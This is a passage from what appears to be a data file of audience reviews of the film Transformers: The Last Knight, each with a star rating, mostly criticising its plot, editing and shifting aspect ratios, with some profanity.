Prime and, after that, he isn't seen for a BIG chunk of the movie. Because, for one reason or another, the screenwriters think that people care about these human characters. They don't, they're just talking heads. They're there to deliver the lines that you have on your script. I feel like having people talk in Michael Bay's Transformer franchise is a concession he made because he couldn't just put on explosion, after explosion, after massive robot fight, after explosion without just a little bit of context. I honestly don't know what would be preferable. Because while a lot of the unnecessary fat would have cut out, this ultimately still a poorly-structured action movie. There's nothing wrong with a movie being all-action and no story. The Raid did this and it has gone to be revered (by me) as one of the best action movies of all time. The thing is that you have to know how to structure and edit your action so that everything you're seeing makes sense in how it's choreographed and pleasing to the eyes. The last thing that Transformers is is pleasing to the eyes. I mean it's a very pretty movie when it's standing still, it has that Hollywood shine and gloss all over it, but when it's in movement and when the Autobots and Decepticons are fighting each other, all hell breaks loose. All you see is metal clanking against metal and it's all just a blur. You have no idea what you're seeing at any time. They think that throwing everything AND the kitchen sink at you is what you want. No, not really. Well, not that that can't help, but I feel like a more subdued approach would work so much better than this. Black Panther is a recent example, while the film had action (and it was very good), I feel like they used it sporadically so that when they did use it, it meant more and it had more weight behind it. Then again, Black Panther also has one of the best and most complex characters in the MCU and the most complex character in this movie is, say, well, nobody. Another thing is that the film is shot in THREE different aspect ratios, so expect to see Bay rapidly shift between each in the same scene. It's such an awful and jarring effect. I honestly have no idea what the point of it was. It's like three different personalities tried to direct this movie. But, really, the joke's on them, that's just how Michael Bay really is, he's that stupid to actually shoot the film on three different aspect ratios and then rapidly shift between each constantly throughout its bloated run time. I didn't wanna say stupid, because I feel like that's too personal, but I can't think of any other way to describe it. It's stupid and it's not satisfying to see. The movie, even when it's standing still, can't let up with trying to be jarring, hence the three different aspect ratios. It was awful and I hope nobody ever does this again. Not saying it can't work, but use it tactfully and make sure it's to the actual benefit of your film's visual style. Don't just make another attack on the senses. Is this the worst Transformers movie? Honestly, I don't know. Revenge of the Fallen was an awful experience. I don't know if this can surpass that. What I do know is that if it is not the worst, it is the second worst. It's worse than Age of Extinction and worse than even I could have possibly imagined. I think I've made my thoughts on this perfectly clear. This is the same overstuffed, bloated and overlong bullshit that the Transformers film franchise has been since the beginning. The narrative is a bunch of nonsense and is poorly put together. The characters are awful (minus Burton and Cogman). The action is an incredibly loud mess. If this is what you love, then by all means, watch this movie. But this is still very terrible and with it being the least-successful entry in this franchise, I sure hope that this is the last we get of this goddamn franchise. I'm fine with Bumblebee prequel, which is being directed by the same guy that made Kubo and the Two Strings (a movie that I loved). It's a completely different team and I'm hopeful that they're able to inject some life and, most importantly, quality into this franchise. The main Transformers franchise, however, can fuck off. And, if this is the final nail on its coffin (which it probably won't be, given that studios want to compete with Marvel and the MCU), then good fucking riddance.",1

Wow. That was a complete disaster. You could literally look away for 10 minute stretches and not miss anything. Way too long and drawn out. Confusing scenes. Piece of junk!,1.5
I gave it 1 and a half star review cause it feels dry feels like it is the same movie over and over,1.5
"way too fast paced, too many cuts. one scene particularly is in a run down town in a desert, the next cut is of them running through an abandoned city, then it cuts back to a desert town... wtf. Was it just me? Or did every camera change also mean the height of the scene was changed? I watched on amazon prime so maybe that was the issue...",1
"Incredibly stupid and unbelievably corny, 'Transformers: The Last Knight' is poorly written in pretty much every -- plot, characters, dialogue - and ends up being a messy, noisy, hectic mess of a film that is all over the place, not just visually (which, you guessed it, consists mostly a hell of a lot of things being blown up). I mean, what did we expect, really? That 1 star is for the opening sequence (which was something new, at least, and I would rather have watched a medieval film about the Knights of the Round Table than what we actually got), as well as the final act which, although predictable and stupid, had a few cool moments. Anyway, it's basically terrible.",1
Made no sense at all. Did not explain anything and had too many storylines,0.5
Guys pls stop hating on these films I like them all,5
What did I just watch?!,1.5
this movie is the worst transformers movie,0.5
The worst of the worst... no plot...forced humor... poorly executed,0.5
"I spent years getting a bachelor's in biology education, master's and PhD in biology. This movie is the exact opposite of all of that. No where in this plotless, incoherent frame sequence could there be anything considered close to a rational thought. All of us who have watched it are now dumber for having watched it. I award Mr. Bay no points and may God have mercy on his soul.",0.5
"Over the top as fuck! A hell of a mess. Too many characters, too many transformers. Shitty cut scenes yet still in my opinion NOT THE WORST TRANSFORMERS FILM. That will always be Transformers 3",3
"When a movie is successful the studio inevitably tries to keep milking the cash cow. The next step to the udder of box office revenue is a sequel followed by a trilogy and if possible the Golden Fleece of cinema, the full-fledged franchise. while the horror genre is infamous for the sheer volume of reaching that level along with an unusual measure of longevity. A close contender must be action flicks. Several examples have even been resurrected after decades of inactivity creating a new archetype, the action hero with an AARP membership. One of the more recent popular franchises is the career-defining movies by director, Michael Bay. He took a popular line of toys from Hasbro, resurrecting its spinoff cartoon television show into a series of movies that have become the epitome of action films defined by excessive, over the top special effective with an unavoidable lack of plot or even a modicum of originality. The line of toys that enabled such a substantial collection of movies to exist was 'The Transformers'. Although they seemingly appear to be mundane vehicles running the gamut from big rig trucks to Volkswagen beetles, they are sentient extraterrestrial warriors fighting to keep the universe, particularly planet earth, safe from their evil counterparts, 'The Decepticons'. Both groups routinely rearrange their configuration transforming into anthropomorphic warrior robots. In most franchises a phenomenon referred to diminishing returns is in effect. Each successive instalment of a franchise receives predictably lower critical assessment to the point where film considered here, 'Transformers: The Last Knight', received an aggregate score of around 15%. What guaranteed the continued support of the studio is the fundamental fact that the franchise remains profitable. This latest offering did loss a considerable portion of the investment, but the bottom line oriented executives understand that the income from cable TV, streaming services and home media will likely make up the difference. Using the popular analogy of cinema as a dining experience there are time when you need a fine, five-star meal but other times the guilty pleasure of fast food fills your craving. It, might be the proverbial 'all sizzle and no steak' but it does appeal to the inner child lurking within. There is a certain degree of liberation for a filmmaker such as Mr. Bey when his best-known work has become synonymous with bad movies driven by extraordinary special effects. He realizes that the normal constraints applying to maintain continuity no longer represent a professional or artistic criterion. All that matters is to satisfy the puerile expectations of the target demographic, teenage boys, augmented by adult men still dreaming of a carefree youth in the dark of the neighborhood theater. To this end, Mr. Bey threw caution, and plot consistency, to the wind taking the audience back in time to 484 CE, the period of the legendary King Arthur (Liam Garrigan). The King is shown leading his valent knights against the Saxons. To ensure their victory Merlin (Stanley Tucci) seeks the assistance from the Knights of Iacon, a group of twelve Transformers that were hidden on Earth. Apparently, our planet is a favorite place for sentient machines to hide. The Knights bestow on Merlin yet another powerful extraterrestrial artifact, staff. The Knights then change, combining themselves into a giant dragon with an appropriate Medieval name, Dragonstorm. With the creature's assistance Merlin is victorious over the Saxon. Before the conclusion of this prologue, the Knights warn Merlin that one day something very evil will seek the staff. This is a standard plot device that conveniently connects the past to the present. The story resumes two years after The Battle of Hong Kong; the climactic special effects showcase from the franchise's previous installment. 'Transformers: Age of Extinction.' Resulting from those events all the world governments have renounced the Transformers declaring them outside the protection of the law. The enforcement of this was given to the Transformer Reaction Force (TRF), formed to eradicate all Transformers and any alien robots. The TRF used members of the former elite CIA black ops unit known as Cemetery Wind. Any fan of the genre can easily predict the outline of the next pages of the script. Enormous metallic horns begin appearing around the globe. Near the battle ruined Chicago, a group of kids stumbles across a spaceship that contains one of the knights. As a TRF surveillance drone is about to locate them, a survivor the battle, Izabella, an orphaned girl, rescues the children and Transformers. She is with by her two faithful Transformer companions, Sqweeks and Canopy. They are small versions of Transformers constructed by sundry parts. The primary function of these characters is comic relief and toys ideally suited for marketing. They make their way to one of the persistent human characters, Cade Yeager (Mark Wahlberg). At this point, some of the pertinent cast members are inserted. The tracking device of fan favorite Transformer, Bumble Bee and a squad of Decepticons including Nitro Zeus, Dreadbot, Mohawk, and Onslaught. They were being detained, but their services were requested by Megatron, the brother of the leader of the Decepticons, and the brother of the Autobot leader, Optimus Prime. This sets the pieces on the board prepared for action. Normally this plot development is referred to as setting the chess board. Considering the over-simplicity of the storyline a checkerboard would be more actuate. As is often the case with franchise degradation, the initial outing represents a sufficiently well-crafted movie to gather a core group of loyal fans. When the first sequel hits the cineplex, the quality is often close enough to its progenitor that with the story directly following the initial that the fans can allow themselves the relative luxury of self-delusion regarding the increasing downward spiral; This movie is considerable down that slippery slope of mediocrity that ultimately is given a perpetual among worst movie lists and notable Razzie winners. When a story possesses such a dearth of original material that a directorial choice to judiciously edit the movie to a concise account could have provided a substantially better experience. Instead the infamous Bay Bloat with a running time of 165. The theater tickets should have included a complimentary tube of Preparation-H. It is certain that only a minuscule portion of the estimated $216 Billion budget allocated to acquiring the services of a professional script doctor. Over six hundred of the closing credits are dedicated to Special Effects and Visual arts with close to a thousand more listing representing stuns, lighting and sound. The regrettable conclusion that is inevitable is that sitting in the dark watching that seemingly endless list of names scroll by is significantly more coherent and arguably more entertaining than the movie. The film is little more than a demo reel of the special effects companies that managed to secure their immediate financial security by winning the contracts to participate in the movie. Considering the expanded profit opportunities afforded by the numerous forms of home entertainment it is feasible that this is not the end of the franchise or Michael Bey's commitment to the financial security of special effects wizard",1.5
i didnt hate The Last Knight i hated Age of Extinction,3
Worst movie I have ever seen.,0.5
A shittier version of part 3 and part 3 was pretty bad too.,0.5
"We all know the Transformers franchise is a dead horse at this point and, despite the cool looking trailer, the fact that we'd all officially had enough of giant alien robots fighting other giant alien robots by the time Age of Extinction came out on DVD and Blu-ray meant that, for anyone who didn't mind a fourth film, the franchise finally overstayed its welcome. The box office grosses certainly do a good job of backing me up on that statement. Same old, same old and NC was right. Well-done special effects and sound design with the humans' performances being ironically, more robotic than the actual robots with decent voice acting. All while Michael Bay and the screenwriters mistake robots cursing and Austin Powers-esque sex jokes for classic comedy. The action sequences aren't even that thrilling anymore and I didn't care what happened to anyone regardless of their benevolence or malevolence. This movie also has terrible editing as well. I could barely comprehend what was going on thanks to the editors jumping from the US to Cybertron to England. Coupled with an annoying change in aspect ratio that aren't even to witness something visually stunning like with Interstellar and Tron: Legacy. It's even when Merlin is trying to reason with a Transformer knight. The continuity has become really convoluted at this point. I may not jump on the Bay-phobic bandwagon but I will agree this movie is awful. Let's hope Travis Knight can do a good job with the Bumblebee spinoff seeing how he already directed one amazing animated movie.",1.5
"To be fair, this is not the most complex plot ever invented for a movie of this type. I have watched it twice now, and I must say that it is a very enjoyable and entertaining film to watch. I congradulate Michael Bay for a well-produced and fun cast that delivers one of the better movies of the Transformers genre. Hopkins is an excellent choice to develop all the King Arthur story line is short order. Wahlberg and Haddock provide very enjoyable interactions throughout the entire film. I find the criticism of this film on par with the current misjudgment and mistrust of many critics reviews. It seems they approve the movies that provide funding for themselves far greater than objectively reviewing films with integrity. Many films in the 2017 era can be seen to have a wide disparity between critics and audience scores. This film was an exciting story that, despite some flaws, was an enjoyable movie to watch.",4
"I want to give this movie ZERO stars. I dont expect tons of character development or the most logical of plots. But this has nothing even close to any of it. This is like they took an idea board for all the previous movies, put a twist on them and just do them all in one movie. Absolutely abysmal",0.5
"Although this movie was kinda bad, I did actually like it. It had great action scenes, the humor was okay. But it was said that this was the last in the series so this would be a good movie if you focused more on the robots then the humans. And instead of Unicron being earth, the earth could become the Omega Lock and we could finally see returning characters from the old films. But it was an entertaining ride to sit through.",2.5
Didn't spend a dime of my money on this when it was in theaters but someone explain to me why I am so angry watching it on Hulu?? Must be because it wasted an hour of my life! Complete garbage on top of garbage! Couldn't finish it didn't want to finish it!,0.5
"Zero acceptable dialogue, oh my holy goodness!!!",0.5
"Bay can't make movies. It's a good thing that he finally stopped, for good this time. -100/10 B's (never see a movie directed by Michael Bay, because they all suck)",0.5
i like this film in the franchise,5
Possibly the worst movie I've ever seen. I'll never get that 90min of my life back,0.5
A lot of money was spent to make a terrible movie.,0.5
"enjoyable, great action sequences",3.5
Urg.... its amazing I even sat through this entire thing. Pure garbage.,0.5
"Ok, so I have tried to watch this. No character development. I really just don‚Äôt get most of it. An unfortunate disappointment given the cast.",1
Better than the last one. Prime is barely in it.,2
"The Half Star goes entirely to the Special Effects Professionals, as I have always thought the transformers look kind of cool. Otherwise this movie is practically unwatchable. Literally, it moves so fast and the characters are practically speaking another language they're so out of tune.",0.5
This story should be stopped on the third part.,0.5
"When you look at it, this movie has everything to be good. It has a good soundtrack, the best CGI I have ever seen, great action scenes, great actors/acting, great voice-overs,... But what made this movie so bland and dumb, was the writing. Without a good story, withour good writing this movie is nothing more then pointless shooting and explosions. It had great potential when you look at it, but they should have put someone else in the directing seat. Someone that cares about a good story with the best action scenes. It's a bloody shame that Michael Bay stayed for as long as he had.",2.5
even worse than age of extinction!,0.5
absolutely Terrible. omg worst Transformers movie ever.,0.5
"I thought its predecessor Age of Extinction was one of the worst movie ever made, this one is worse. How can they waste over 200 million dollars in making this? Can't say even one good thing about the movie, the direction, editing, script, dialogues and acting, all were just horrendous.",1
Interesting if you hold to the standards of a Michael Bay film but tedeous if you expected more,5
I had the bad luck of catching it on hbo. unwatchable.,0.5
This was the best Transformers movie. The others were entertaining but just ok. This one had a great story and enough breaks in between the action to catch your breath.,4.5
"Super disappointing. So many inconsistencies, and story/ scenes that didn‚Äôt make sense. And horrible acting. Marky Mark can‚Äôt carry leading role.",1.5
"The best part of this movie is the action, the story was very lack luster. I think it had potential with a good cast including Anthony Hopkins, but the writting always falls short in these movies. You can watch it over and over for the action, you just might scratch your head at certain spots.",2
"Take 15-20 Transformers toys, 5 matchbox cars, and 3 dinosaur action figures. Stick them in a Ninja Blender. Hit Frappe for 2 1/2 hours. That's what this is. This is not a movie. This is a headache.",1
This wasn't even a movie.,0.5
I was completely lost. It reminded me of a film that was put together by junior high students at best.,0.5
Half a star is too many.,0.5
Was this edited by a three year old? Maybe it an adult on meth? This movie made absolutely no sense keeps jumping from storyline to storyline with no backstory making no sense whatsoever. this show was an absolute turd!,0.5
Utter piece of crap. I only watched it because it was free on Amazon Prime.,0.5
"Okay lets start with the good part, it has an amazing and seamless visual effects, its an improvement to the last one (age of extinction), it has a good musical score, and that's all, now lets go to the bad part, it has a bad story, bad plot and has a lot of plot holes, a lot of nonsense subplots/military subplots, a lot of side characters and clich√©d characters, cringe worthy humour but its less cringe worthy than the previous ones, i didn't hate the last knight, its still entertaining especially for normal movie goers, the ending is entertaining but is still bad and the new bumblebee is really good, Mark Wahlberg is better in this one and his chemistry with Laura Haddock is amusing, but in the end this movie is basically just the same as the previous ones, oh i also want to mention the changing of aspect ratio in the movie, it annoys me so much",1.5
This movie is terrible. So terrible I created an account just to say this movie is terrible. :),0.5
This has to be one of the worst movies ever made. Everyone involved should be ashamed. It's like a poor man's National Treasure but with no redeeming value.,0.5
"Transformers 5 good, it's good but not so good, good plot, good special effects, I do not like something that gives much importance to humans, but it turned out to be something better than the fourth installment",2
"Once again, Bay's incessant need to drag all involved into a vortex of douchebaggery, with an undead skeleton of world-building as Paramount funds the US military in propagandic fashion, results in a franchise whose only virtue is looking prettier with each installment.",2.5
"I think Michael Bay wanted to put everything he could think of in the movie. And he did. To properly make this movie, it would have to be about 6 hrs long.",0.5
The transformers movies always seem to be disliked because for some reason they use a large amount of special effects. But how would movies about robot aleins with fighting eachother be any good without tons of special effects. Besides this one has the best story and cast in my opinion. You got Hannibal Lecter in it(Anthony Hopkins) and other famous actors in the film. What makes this a good transformers movies as it's much different than the last four. Transformers the last knight is awesome.,5
i loved this film i want a conclusion you cant do this to transformers,5
"The only redeeming part of this movie is Sir Anthony Hopkins deciding he's just going to do whatever he wants, both in the story and in the real world in taking all of these bonkers roles. Listen, we all knew what we were getting into when we sat down to watch this movie. Mark Wahlberg being Mark Wahlberg, Michael Bay level shitty explosions, and a vague attempt at a plot that seems relevant to the world today. I'm not mad, I'm just disappointed in myself for falling yet again. This franchise has gotten about $100 from me in total, and that's a new level of masochism few have reached.",2.5
"Transformers: The Last Knight is an exciting apocalyptic adventure, Michael Bay style. After leaving Earth to find his creator Optimus Prime returns to Cybertron and finds it completely destroyed but meets a powerful goddess who promises that she can restore it; meanwhile a British secret order assembles a team to recover a lost Cybertronian weapon that can stop a coming apocalypse. Anthony Hopkins joins the cast and delivers a pretty strong performance, and Laura Haddock has a lot of charisma and good chemistry with Mark Wahlberg. Additionally, a couple of cast members from the original trilogy return; provoking some nice series continuity. And as always, the special effects and fight sequences are exceptionally well-done. One of the better entries of the series, Transformers: The Last Knight is a thrilling, big-budget sci-fi film.",3.5
total crapfest. only good acting is done by Anthony Hopkins. this movie is directed w/all the subtlety of fingernails on a chalkboard.,0.5
Cheesy. Michael Bay explosions. Exactly what you would expect.(50%),2.5
JUST QUIT!! Grade: C-,1.5
"What a hot mess for a movie! Incomprehensible, fast paced and bloated, two stars because we always enjoy Optimus kicking ass.",2
"I'm sorry but despite the Mark Wahlberg brilliance and English humor it was hard to bare. There was too much going on at any time and most of the jokes were used before, it was too long and too complicated.",1.5
i really enjoyed this dont understand the hate towards this film,5
I wanted it to be good but it was a mess. Stop making these movies Bay,2
It could of been better because Optimus prime was in there for 5 minutes.,4
Throughly enjoyed this movie!! Much better than Age if Extinction. Love the fact Megatron was a badass again in this movie!!,5
it was a great movie love it its my opinion i love the baysformers movies this is my personal favorite,3.5
"Clearly the Transformers series has overstayed its welcome (it probably did that by the 2nd installment) for this the fifth(!!) film is an abomination. The narrative is pretty much one thing: Giant robots punching one another as hapless humans flee for their lives but what is shocking is that even these CGI ridden overloaded set pieces stop making sense after about ten minutes in. In fact, most kids (or anyone brave enough to go watch this) will have a hard time telling who is fighting who. Even by Transformers standards this one stinks to high heaven, and that is saying something.",3.5
I actually liked it.,3.5
"Almost like a tourist rollercoaster ride through ancient artifacts from museums to old castle homes, and famous old site visitation like The Stonehenge that somehow remained undamaged from an avalanche of bulletfire and bomb attack. Excellent 4k bluray sights and sounds, but jumpy with the occasional blackbar non-IMAX scenes. Enemy has weakness and strength- a weakness of removing the 12 guards protecting the female robot villain too preoccupied on planet reconstruction and she never showed much in defending herself.",3
I love transformers but this was the worst movie ever.,0.5
6/10 better than the rest... still childish,3
people may think its bad but its not about megatron now its about unicron,5
Transformers has been a huge disappointment all together. Its a shame. Good childhood memories.,0.5
The Last Knight? More like Hopefully the last one,0.5
"Sin relevancia, un film que no cuenta con ningun punto fuerte,aburrida y mal dirigida mal actuada mal montada, simplemente un chiste completo.",0.5
Transformers: The Last Knight shows that there is suprisingly more to the Tranformers franchise. More to ruin that is,0.5
I loved the movie a lot,5
"The original Transformers went big. Every minute of it was packed with action. I was eager to know what would happen in the next minute. Revenge of the fallen which followed next suffered from the writers' strike prevalent at the time. And so began the downhill. They dropped Megan in a prequel comic. Dark of the Moon was only a massive explosion. I believe they suffered from an urgency to go bigger. They needed to outdo themselves. In 2007 when the first film came, they didn't need to go bigger than anything, they just went for it. Disaster struck when Shia and everyone we knew were dropped in the fourth film. Mark is no bad actor, just that transformers franchise never needed a no-nonsense badass guy who always tried to act tough. Shia had all the elements to retain the lightheartedness. Introduction of Mark gave the idea that the franchise is taking itself too seriously. And we have come to this. It is saddening to see what has befallen a series that started with a film which still remains my most favourite film.",3
"The Transformers truly deserve better. Michael Bay directs the fifth installment in this lackluster series, starring Mark Wahlberg who would rather be anywhere else, and Anthony Hopkins who is just having fun being in a dumb popcorn movie. The plot is a jumbled mess, with era's changing and plot lines making no sense, it was clear multiple stories were just thrown together without care. The visual effects sometimes are great but overall are awful, Continuity errors with the Transformers for some reason. The aspect ratio changes nearly every shot and it's annoying, the acting is awful, the comedy is cliche and terrible. The music is alright, but utilized horribly. Optimus Prime is barely in the movie. Him being evil is lackluster and doesn't live up to what a Nemesis Prime could be. The villain is interesting but never explored. This film doesn't make sense as being apart of 4 other movies. The transformers are very good however, Peter Cullen and Frank Welker do an incredible job as Optimus Prime and Megatron. The new additions such as Isabela Moner are horribly written and not utilized well at all, there's literally a line where they ask her ""what are you doing here?!"" and she says ""I don't know!"" This movie is a guilty pleasure it's laughably bad, and I highly recommend watching this train wreck of a Transformers film.",1.5
"PLEASE GOD NO. PLEASE NO, NO.",0.5
people give hate but i understand everything and micheal bay does a great job,5
Horrible in every way. This movie is for dumb people.,1
"Transformers: The Last Knight (2017) Plot: Our world's greatest hero becomes our fiercest enemy when Optimus Prime launches a mission to save Cybertron by destroying Earth. Now Bumblebee and Cade Yeager (Mark Wahlberg) must lead the Autobots against their former ally in the ultimate battle to save mankind from annihilation. Review: This epic movie certainly looked amazing and the attention to detail was great but from an entertainment point of view, it was a total let down. The storyline was all over the place, and the human characters became extremely annoying after a while, except for Anthony Hopkins (Sir Edmund Burton), and his reliable robot Cogman, voiced by Jim Carter. Mark Wahlberg (Cade Yeager) didn't seem like he wanted to be there most of the time, and Laura Haddock (Vivian Wembley), the Angelina Jolie lookalike, didn't suit her role. Stanley Tucci (Merlin) made me laugh and Josh Duhamel (Colonel William Lennox) played a convincing soldier but I didn't see the point to the little girl Isabela Monet (Isabella), who seemed to get in the way most of the time. Anyway, with the Autobots still at war with the Decepticons, as usual, the humans are out to capture all of the Transformers, and with Optimus Prime gone, they are all in hiding with Cade helping them to survive. Optimus Prime finds his dead home planet, Cybertron, and meets his alleged creator, Quintessa, who tells him that he needs to get Merlin's staff to absorb Earth's energy to restore their home-world. Meanwhile, Cade is given a precious mechanical talisman from a dying Autobot Knight, and while he is battling against the TRF drones, he is approached by Cogman who invites him to the UK to meet his employer, Sir Edmund Burton, who shows him the history of the Transformers and the power of the staff. To get to the staff, he needs the help of Vivian Wembley, who is a English Literature Professor and has the power to control the staff, so they set of on there mission, with Optimus Prime close behind them. Whilst battling against the TRF and Quintessa's soldiers, there is a race to get to the staff before it destroys earth. There was much thought behind the storyline but I personally thought that it was a right mess. It also lacked wit and there wasn't much depth to the various characters. With that aside, the action scenes were half decent and the transformers looked great but it wasn't enough to save the movie. I really think that they need to go back to the drawing board with this franchise, because all of the movies haven't been that great, and they seem to be getting worse. If they do decide to release another Transformers, they really need to think about character building, more than the CGI content, even though it made a decent profit at the box office. Average! Round-Up: This movie was directed by Michael Bay, who brought you the Bad Boys franchise, The Rock, Armageddon, Pearl Harbour, The Island, The Transformers franchise, the great Pain & Gain and 13 Hours. With so many hit movies behind him, I'm not surprised of the scale of this movie but I still wasn't impressed with the outcome. The corny script and poor acting has been the main problem with the whole franchise but they all seem to make a lot of money, for some unknown reason. With another Transformers movie in the pipeline, due to be released in 2019, I hope that they choose another director for the project, who will give it a fresh concept, and hopefully a decent cast. Budget: $217million Worldwide Gross: $605.5million Genre: Action, Adventure, Sci-Fi Cast: Mark Wahlberg, Anthony Hopkins, Josh Duhamel, Laura Haddock, Santiago Cabrera, Stanley Tucci, John Turturro, Isabela Moner, Jerrod Carmichael, with the voices from Peter Cullen, John Goodman, Ken Watanabe, Jim Carter, Steve Buscemi and Omar Sy. 4/10",2
"Watch genius Michael Bay explode a junkyard down your throat!! TRANSFORMERS: THE LAST KNIGHT I have endured many bad things in my life. However, having to watch Michael Bay self-promote himself every time I went to see an IMAX movie in the last 4 months might be one of the worse. It is the fifth movie of the franchise. Last time, I had to sit through 3 hours of a glorified toy commercial. But this time, it's different! This time it has knights! If you couldn't spot the irony in the last sentences, you might be capable of writing a screenplay for a Transformers movie, congrats! I do have to say that consistency is key and this film sits alongside Moon and Extinction to create a shiny metal catalog of what NOT to do in a movie. With next-to-rubbish performances, a latina character that since Logan can be considered token, misused nazi imagery, repulsive script with the usual dose of racism, the blatant and constant shifts in aspect ratio which wouldn't allow me to be pulled into the movie, etc, etc. The only thing I'm not as mad this time around is with the cinematography, which I have to admit as having less blues and oranges and a saturated color pallet to a more crisp image (sometimes). In a lot of ways, this film is the epitome of what can be done in visual effects as the titular creatures have never look greater. Yet, as usual, they are trapped in a movie critic's nightmare. It would be a truly out of body experience if I could turn off my brain and enjoy this film but the movie simply won't allow it. This is what happens when you give too much power to a director that likes to have it his way. Of course he'll want to shoot it from 20 different angles, he has the money to do so and absolutely no point of view to choose just one! And of course the editing is going to keep those same 20 angles because if you keep cutting, the audience will be entertained, right? What annoys me the most is that an action movie will continue to have its action overcut and disorientating in the fifth try! There is no order, no excitement and no enthrallment if you can't understand what's happening. Is cinema just noise and explosions? It seems like the original cut of this film had 3h and someone came in and said ""No, take 5 seconds out of every shot, that'll do it!"". Furthermore, Hopkins is a dud, it's revolting to see such a great actor so desperate for a fat paycheck and the whole templars/middle age storyline is so uninteresting and disconnected and it's sad that no one could have scrapped that out. In about 30 years, what movies will be chosen to tell our story? Judging from the current state of our political and social panorama, I would say that this testosterone-filled, rushed chicken feed and unimaginative piece of ""film"" might just make us justice.",0.5
watched it in cinemas had no problems with it only megatron and decepticons were weak,5
i have no problem if hey make 70 more they get better and better,5
"The only reason that I think that this movie is bad is that it's a disappointment more than anything. When you go to see a transformer movie, you expect to see giant robots fighting, but instead you get a history lesson about King Arthur. But otherwise, I thought it was passable.",2.5
"Drawn out, overly long utter drivel, with the occasional spectacle of CG sensory overload. If a movie ever had HADD this it. Makes no sense, and never settles on anything long enough to even try.",1.5

"The most confusing, chaos-driven and illogical installment in the Transformers franchise - and that's saying something.

"""Transformers : The Last Knight"" Wasn't Even Fun. It Was Cringy, Poorly Edited And With A Truly Awful Script. Anthony Hopkins And Mark Wahlberg Were At Their Weakest Performances And The Only Thing That Michael Bay Could Do, At Least Decent ( The Action Sequences) Were Bad, Poorly Edited And Cringy. The Question Remains : Why Keep Making This Movies?",1.5
One word - HORRIBLE!!!,2
"Absolutely awful film. The plot is ridiculous add the whole story is a complete mess. The acting is also fairly dire, Sir Antony Hopkins what were you thinking? The robots are still pretty awesome, but if I was you I would find something much more interesting to do with 2 and a half hours of your life!",0.5
Preferred this film to all of the others. Still confusing during battle scenes as to who is who but the story was more interesting and they turned down the cheese........ Only a little.,4
Feels like a script written by a committee rather than anyone who knew the source material,0.5
The movies kind of grow on you the more you watch them.,5
Over long. Another mind numbing entry by Michael Bay. It just has just loud explosions. A plot that is not only terrible and just undermines everything that went on before. Michael Bay should never direct another film ever.,1.5
An absolute mess. Michael Bay couldn't tell a story if his life depended on it. How are they still financing these piles of pig crap,0.5
Great movie. Captivating human characters with humorous interaction with the alien machines. I felt the ending was a cacophonic mash of confused scenes. And one CORRECTION - Namibia is not in West Africa,4
"I would put 0 stars but, unfortunately that mark does not exist",0.5
"Insipid and incomprehensible in the way only a Transformers film can be. This one, I think, in particular panders to 13 year old boys - which is fine! Play to your demographic, because aint no one else buying this shit anymore. It's entertaining from a detached perspective, mostly because of the constant awe of seeing exactly what Michael Bay can make his Cohen Bros. cast (and Anthony Hopkins) do for cash. Transformers 5 is anti-art, but as a MOVIE - for idiots (the only fans left) - it's as ""sure that was fine I guess"" as it gets.",2.5
"Not as good as any of the other ones. But It's still a great action movie that's so entertaining. Mark Wahlberg was great in this movie just like the last one. Loved it. So much fun to watch, and great experience to enjoy.",4.5
"this is the worst transformers movie ever displacing age of extinction . the visuals were okay but the storyline was bad , indeed bad",1.5
This film was a complete disgrace to the Transformers franchise. It is indeed the worst movie directed by Michael Bay,0.5
"This and AOE I watched in the theatre, the first ones I did watch there. And that's why they're always gonna be my faves of the 5. AOE is my No. 1, but the final fight in this... good god, where to start. The gyroscopic action because of the crumbling Chamber, the epic 'We Have To Go' song by Steve, hearing Prime and Megs original Latin American dub actors from the trilogy back into their roles after they're absence from the 4th blasting through the speakers (I watched in Spanish, yes), each and every single one of the aspects of this final fight is a monument to the amazing cinematic universe created by Michael through these 10 years and I'm hurt that Hasbro canceled all future proyects except for Bumblebee. But these films forged my love for action, special effects, epic music, explosions and of course Linkin Park. These are not to be viewed as Shakespeare proyects, never were and never will be. They're fun and entertaining movies to spend a while with your friends and family. Critics look to dismember these as 'the disasters they are' and, frankly, I also have my gripes, but they don't take away the fun factor. I enjoy them everytime and will never get tired of watching them.?",4.5
No. Just no. I despise this movie and Michael Bay along with it.,0.5
What The F***ing s*** is this piece of garbage.,1.5
Ya es la numero 6 y empieza a ser mas de lo mismo 6/10,3
"When watching this movie, every action seemed to be cut short and seemed unfinished. Wish they would have drawn on the story they already had instead of making up more nonsense especially when the lore set into the canon was retconned by Bumblebee",4
Movie at the lowest level... Not worth your time...,1.5
please dont do a reboot thisis my childhood and now just ahhhhhh,5
Filme sem nenhum roteiro. E melhor assistir o filme do pel√© do que esse filme ruim demais. Franboesa de ouro nele.,0.5
thats the best i can give it,0.5
Awesome! They captured the spirit and tone of the original series and comic perfectly and the special effects were better than expected. The ONLY bad thing I would have to point out is that they should have spent a little more time with the 'bots and a little less with Sam.,5
"I think the film needed to stop after 3. This story makes no sense. The Transformers are Racist with racist stereotypes. The deceptions look very weak, megaton seems the weakest out of all films. Waste of hype for bumble bee and barricade considering that there is literally no fight at all. What was this movie supposed to be about? Cyber Tron, Optimus evil for 4.5 seconds? The World will never know. Don't even get me started with the annoying characters like Cog man and Izzy. Some characters in this film are trash and useless to the story overall. The film is fast paced and will make you wonder why I payed for this garbage in the first place.",1.5
"The last knight has everything you would expect, awful editing, another bad scrip and boring running time, it's a technical nightmare",0.5
There is nothing remotely good about any of these movies. Micheal Bay's menthol is just to put explosio after explosion hoping for people to like it. It's a failed system and it never has a story. If you cant tell your robot movie in under two hours don't make it. No robot movie should be longer then two hours. Nothing is good bout this movie it's all bad,0.5
Transformers movies are becoming worse to worst.i think michael bay have lost his mind.,0.5
they just had to have more megatron fighting optimus prime thats what made the first 3 transformers films superior,5
the previous fil age of extinction bought dinobots into the franchise but this film brings UNCIRON AND PRIMUS im a hardcore fan of transformers amd im sure if you did not get the films meaning search it up.,5
not as bad as the dark of the moon but a tie with age of extinction,5
mark walhberg please stay cant go through another cast change,5
megatron vs all the autobots fair fight yeh....................,5
nemisis prime vs bumblebee was just pure epicness and megatron vs hound brilliant,5
"i don't know where i read it, but it¬¥s true, longest trailer ever",2
Holy shit this movie sucked!,0.5
"Full of cliches, gaping plot holes, and overkilled CGI. If you dare watch this movie I recommend making a drinking game out of it, a shot everytime something doesn't make sense, whether in the literal sense or in relation to the story. Also, watch it on the biggest screen possible and even then you'll probably feel lost in the monolithic CGI.",1.5
